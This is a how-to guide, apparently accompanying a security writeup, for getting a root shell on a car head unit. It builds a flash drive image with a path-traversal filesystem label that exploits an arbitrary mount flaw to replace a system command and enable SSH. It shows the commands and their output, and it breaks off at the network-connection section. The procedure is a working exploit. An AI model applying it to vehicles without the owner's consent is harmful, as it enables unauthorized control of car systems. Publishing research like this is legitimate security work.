# Rootshell How-To

The main writeup goes over system overview and the whole discovery process. This is a shorter guide that should be easy to follow. 

#### Table Of Contents

- [Preparing the flash drive](#preparing-the-flash-drive)
- [Connecting via network](#connecting-via-network)
- [Testing on other models](#testing-on-other-models)

## Preparing the flash drive

As discussed in the full  writeup, to gain a remote root shell on the head unit, we can abuse the arbitrary mount vulnerability. In short, this vulnerability lets us replace certain system commands with ones of our choosing. 
To do so , we must prepare a flash drive with a special file system. Script `rootshellfs.sh` will create an `ext2` file system image of 8mb and copy `logger` script to it. The created filesystem will have it's UUID set to empty and FS label set to `../../usr/bin/` which is what we need for exploit to work. You should see something like:

```
$ ./rootshellfs.sh
8192+0 records in
8192+0 records out
8388608 bytes (8.4 MB, 8.0 MiB) copied, 0.0269391 s, 311 MB/s
mke2fs 1.45.5 (07-Jan-2020)
Discarding device blocks: done
Creating filesystem with 2048 4k blocks and 2048 inodes

Allocating group tables: done
Writing inode tables: done
Writing superblocks and filesystem accounting information: done

======================================
Rootshell file system prepared. Insert flash drive and do:
$ sudo dd if=./rootshell.ext2 of=/dev/sd#
Make sure to replace sd# with your actuall flash drive and don't overwrite your system drive!!!
```

Above will create a file called `rootshell.ext2` which must then be written to your flash drive directly (not copied to existing file system). NOTE: This will effectively erase any data that is present on the drive, so make sure it's empty. Easy way to write this image to flash drive is via `dd`, as the shell script instructs:

```
$ sudo dd if=./rootshell.ext2 of=/dev/sdb
16384+0 records in
16384+0 records out
8388608 bytes (8.4 MB, 8.0 MiB) copied, 0.0208436 s, 402 MB/s
```
That's it. The flash drive is prepared. Eject it and go to your car. 

Next step is to actually execute the exploit, which is very simple. Turn on the head unit (the car doesn't have to actually run, key in ON position). Wait till the system boots up and navigation or radio starts and simply insert the USB flash drive. 

If everything went according to plan, you should see the lcn2kai reboot after about 10 seconds. 

Make sure to unplug your usb flash drive before the system boots up again! If the whole thing worked, when you open the flash drive on your computer again (it's ext2 file system, so linux required), besides `logger` script and `lost&found` you should see a file named `it_worked` with kernel info in it:

```
$ cat /media/user/.._.._usr_bin_/it_worked
Linux (none) 2.6.34.13-02018-g843e5c6 #1 SMP PREEMPT Thu May 15 16:58:54 IST 2014 armv6l GNU/Linux
```

That really confirms that code execution has worked and that SSHd should be enabled on the car's head unit. 

## Connecting via network
